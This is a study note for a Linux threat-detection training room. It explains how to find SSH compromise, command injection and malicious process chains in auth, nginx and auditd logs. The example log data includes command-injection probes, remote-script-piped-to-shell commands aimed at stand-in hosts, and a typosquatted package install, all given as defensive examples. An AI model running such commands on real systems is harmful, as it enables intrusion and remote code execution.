# Linux Threat Detection 1

**Path:** SOC Level 1 - Linux Security Monitoring
**Date:** 2026-09-15
**Difficulty:** Medium

---

## What This Room Covers

This is the **Initial Access** stage of a Linux intrusion — how attackers get their first foothold on a Linux host, and what that looks like in logs afterwards. Three routes are covered: abusing SSH, exploiting a public-facing application, and tricking a human into running something. The room then teaches the single most useful investigative technique for Linux: rebuilding the process tree from auditd to find where a suspicious command came from.

Room tasks in order: Introduction → Popularity of SSH → SSH Breach Example → Linux and Public Services → Building Process Tree → Human-Led Attacks.

---

## SSH — The Biggest Linux Attack Surface

**MITRE ATT&CK: T1021.004 (Remote Services: SSH)** — also framed as External Remote Services.

SSH is how Linux is administered, which makes it how Linux is attacked. Shodan data cited in the room puts roughly **40 million machines with SSH exposed to the internet (2025)**. Anything internet-facing on port 22 receives constant automated brute-force traffic as background noise, which is exactly why a *successful* login is easy to lose in the volume.

```bash
cat /var/log/auth.log | grep "sshd"
```

What to compare on every SSH line:

| Signal | Why It Matters |
|---|---|
| Authentication method | `publickey` is the norm for service/automation accounts; a **password** login on an account that always uses keys is an anomaly |
| Source IP | Internal RFC1918 vs external, and whether the external IP matches the user's usual geography/ASN |
| Timestamp | Logins outside working hours, especially for human accounts |
| Preceding failures | A burst of failures followed by an `Accepted` line is a successful brute force |

---

## Worked Example — Spotting the Compromised Account

Three lines from `/var/log/auth.log`:

```
2025-08-19T14:00:02 thm-vm sshd[1013]: Accepted publickey for ansible from 10.14.105.255 port 18442 ssh2
2025-08-20T12:56:49 thm-vm sshd[2830]: Accepted password for jsmith from 54.155.224.201 port 51058 ssh2
2025-08-22T03:14:06 thm-vm sshd[2830]: Accepted password for jsmith from 196.251.118.184 port 51058 ssh2
```

Reading them as an analyst:

- Line 1 is **benign** — `ansible` is an automation account, authenticating by public key, from an internal `10.x` address, during working hours.
- Line 2 is **plausible** — `jsmith` is a human, password auth, external IP, midday. Worth noting, not alarming on its own.
- Line 3 is the **finding** — same account, password auth, but a *different* external IP and 03:14 in the morning. The account is behaving in two different ways from two different places.

The lesson is that no single field convicts. It's the *deviation from that account's own baseline* — method, source, and hour taken together — that identifies the compromise.

---

## Exploiting Public-Facing Applications

**MITRE ATT&CK: T1190 (Exploit Public-Facing Application)**

When the entry point is a web app rather than SSH, the evidence moves to the web server log — `/var/log/nginx/access.log`. The room walks a command-injection attack against a "TryPingMe" app whose `/ping` endpoint passes user input to a shell:

```
10.2.33.10      - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200
10.12.88.67     - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200
10.14.105.255   - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500
10.14.105.255   - - [26/Aug/2025:20:09:46] "GET /ping?host=whoami HTTP/1.1" 500
10.14.105.255   - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200
10.14.105.255   - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200
```

The attack is legible purely from the status codes and parameter values:

1. Normal traffic sends IP addresses and gets `200`.
2. The attacker probes with junk (`hello`) and a bare command (`whoami`) — both `500`, because they aren't valid ping targets. This is **testing**.
3. Adding a shell metacharacter (`;whoami`) flips the response to `200` — the injection worked.
4. Having confirmed it, they move on to `;ls` for enumeration.

**Detection indicators:** shell metacharacters (`;`, `|`, `&`, backticks) in query parameters, Linux command names appearing as parameter values, and a **`500` → `200` transition from the same source IP** — that status-code flip is the moment the attacker found the working payload.

---

## Building a Process Tree with auditd

Web and auth logs tell you *something* got in. auditd tells you what it then did — and critically, **what spawned it**. The technique is to find the suspicious process and walk `ppid` backwards until you reach the origin.

```bash
ausearch -i -x whoami            # find executions of a specific binary
ausearch -i --pid 3905           # look up one process
ausearch -i --pid 3898           # then its parent
ausearch -i --ppid 3898 | grep 'proctitle'   # everything that parent spawned
```

Following the chain from the room:

```
type=PROCTITLE : proctitle=whoami
type=SYSCALL   : syscall=execve success=yes ppid=3905 pid=3907 uid=ubuntu exe=/usr/bin/whoami key=exec

type=PROCTITLE : proctitle=/bin/sh -c whoami
type=SYSCALL   : syscall=execve success=yes ppid=3898 pid=3905 uid=ubuntu exe=/usr/bin/dash key=exec

type=PROCTITLE : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL   : syscall=execve success=yes ppid=1    pid=3898 uid=ubuntu exe=/usr/bin/python3.12 key=exec
```

Read bottom-up, that is the whole breach in three records:

**`app.py` (pid 3898, parent = init)** → **`/bin/sh -c whoami` (pid 3905)** → **`whoami` (pid 3907)**

A Python web application should never be spawning a shell. The moment `ppid` resolves to the web app, the command injection from the nginx log is confirmed at the process level.

Querying everything that pid 3898 spawned (`--ppid 3898`) surfaces the rest of the attacker's activity:

```
proctitle=/bin/sh -c ls -la
proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
```

That last line is the escalation from enumeration to **payload delivery** — pulling a remote script and piping it straight into a shell.

---

## Human-Led Attacks

Not every foothold is an exploit — some are handed over by a user.

| Vector | Example | Why It Works |
|---|---|---|
| **Malicious script execution** | `curl https://shadyforum.thm/fix.sh \| bash` | A user troubleshooting copies a "fix" from a forum or AI answer and pipes an unreviewed remote script into their shell |
| **Supply chain / typosquatting** | `pip3 install fastpi` (instead of `fastapi`) | A single mistyped letter installs an attacker-published package that executes on install |

Both bypass every perimeter control, because the request originates from a trusted user on a trusted host. Detection has to happen at the process layer — auditd catching `curl` piping into `sh`, or an unexpected package installation — not at the network edge.

---

## Detection Cheatsheet

| Technique | Primary Log Source | Key Indicators |
|---|---|---|
| SSH brute force | `/var/log/auth.log` | Burst of failures then an `Accepted` line, single source IP |
| SSH compromise | `/var/log/auth.log` | Auth method change, unfamiliar external IP, off-hours timestamp |
| Web exploitation | `/var/log/nginx/access.log` | Shell metacharacters in parameters, command names as values, `500` → `200` flip |
| Process origin | auditd via `ausearch` | `ppid` chain, web app or service as parent of a shell, `proctitle` contents |
| Human-led / supply chain | auditd via `ausearch` | `curl`/`wget` piped to `sh`, unexpected package installs |

---

## Key Terms

| Term | Meaning |
|---|---|
| **Initial Access** | MITRE tactic covering an attacker's first foothold on a system |
| **T1021.004** | Remote Services: SSH — abusing SSH for access |
| **T1190** | Exploit Public-Facing Application |
| **Command Injection** | Unsanitised input reaching a shell, letting an attacker append their own commands |
| **Process Tree** | The parent/child chain of executions, rebuilt via `ppid` to find an attack's origin |
| **proctitle** | auditd record holding the full command line as invoked |
| **Typosquatting** | Publishing a malicious package under a near-miss name of a popular one |
| **Living-off-the-land** | Using legitimate binaries (`curl`, `sh`, `python`) so nothing looks obviously malicious |

---

## My Understanding in Plain English

What makes this room click is that each log source answers a different question and none of them answer it alone. The auth log or the nginx log tells you *how someone got in*; auditd tells you *what ran and who spawned it*. The investigative move that ties them together is walking `ppid` backwards — because the finding is almost never the command itself (`whoami` is not malicious) but the **parent**. A web application spawning `/bin/sh` is the anomaly, and that single relationship converts a suspicious-looking HTTP request into a confirmed compromise.

The other thing worth internalising is that all three entry routes end in the same place: a shell running as the service account, doing enumeration first and then pulling down a payload. The SSH case, the injection case and the `curl | bash` case look completely different at the perimeter and nearly identical at the process layer — which is a strong argument for why auditd (or an EDR) is the control that actually catches initial access, and why the perimeter logs are best treated as the thing that tells you *where to start looking*.

---

## Related Notes

- [[Linux-Logging-for-SOC]]
- [[Detecting-Web-Attacks]]
- [[Windows-Threat-Detection-1]]
- [[MITRE]]
- [[Cyber-Kill-Chain]]
